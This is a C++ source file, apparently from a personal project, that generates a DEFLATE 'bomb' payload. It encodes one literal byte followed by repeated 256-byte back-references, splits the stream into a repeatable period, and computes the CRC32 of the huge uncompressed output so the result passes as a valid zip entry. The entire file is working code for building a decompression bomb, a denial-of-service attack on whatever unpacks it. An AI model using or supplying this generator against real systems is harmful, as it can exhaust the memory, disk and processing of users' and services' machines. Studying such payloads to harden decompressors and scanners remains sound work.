//
// Created by LeeEeZian on 30/9/2026.
//
#include "factory/PayloadFactory.h"
#include "deflation/lz77.h"
#include "deflation/BitWriter.h"
#include "zip_file_construction/LocalFileHeader.h"
#include <chrono>
#include <iostream>
#include <numeric>
#include <cmath>

#include "Timer.h"

CreateBombPayloadResult payloadFactory::createFixedBombPayload(const size_t size) {
    using namespace lz77;
    BitWriter writer;

    writer.add(HuffmanTable::BFINAL::YES, 1);
    writer.add(HuffmanTable::BTYPE::FIXED_HUFFMAN, 2);

    auto [code, length]{HuffmanTable::fixedSymbolTable('a')};

    const int headerBitLength{3 + length};

    writer.add(code, length);

    constexpr int bytesToCopy{256};

    const MatchCode lengthCode{lz77::getLengthCode(bytesToCopy)};
    const MatchCode distanceCode{lz77::getDistanceCode(1)};
    auto [lCode, lLength]{HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
    auto [dCode, dLength]{HuffmanTable::fixedDistanceTable(distanceCode.symbol)};

    const int totalRepeatableBits{lLength + dLength + lengthCode.extraBit + distanceCode.extraBit};

    const int bytesTillRepeat{std::lcm(8, totalRepeatableBits) / 8};
    const int iterationsTillRepeat{std::lcm(8, totalRepeatableBits) / totalRepeatableBits};

    for (size_t i{}; i < iterationsTillRepeat * 2; ++i) {
        writer.add(lCode, lLength);
        writer.add(lengthCode.extraValue, lengthCode.extraBit);

        writer.add(dCode, dLength);
        writer.add(distanceCode.extraValue, distanceCode.extraBit);
    }

    auto [endCode, endLength]{HuffmanTable::fixedSymbolTable(256)};
    writer.add(endCode, endLength);

    std::vector<uint8_t> all{writer.release()};

    const long long periodStart{((headerBitLength + bytesTillRepeat * 8) / 8)};

    const std::vector<uint8_t> start{all.begin(), all.begin() + periodStart};
    std::vector<uint8_t> period{all.begin() + periodStart, all.begin() + periodStart + bytesTillRepeat};
    std::vector<uint8_t> end{all.begin() + periodStart + bytesTillRepeat, all.end()};


    const size_t totalIterations = 4 * size;
    const size_t numberOfPeriods = totalIterations / iterationsTillRepeat;

    const size_t remainingPeriods{numberOfPeriods - 1};

    const size_t repeatedData{4 * size * bytesToCopy};

    const size_t uncompressedSize{repeatedData + 1};

    Timer CrcCalculation{"Crc32 calculation"};

    Crc32 BombCrc32{};

    Crc32 block{};
    block.update('a');
    block.computeCrc32();

    size_t remaining{uncompressedSize};
    while (remaining) {
        if (remaining & 1) {
            BombCrc32.combine(block);
        }

        block.combine(block);
        remaining >>= 1;
    }

    const size_t compressedSize{start.size()+period.size()*remainingPeriods+end.size()};

    return {.bombRecipe = {.start = start,.period = period,.end = end,.kbSize = size,.numberOfPeriods = remainingPeriods},.uncompressedSize = uncompressedSize,.compressedSize = compressedSize,.crc32 = BombCrc32.getCrc32()};
}
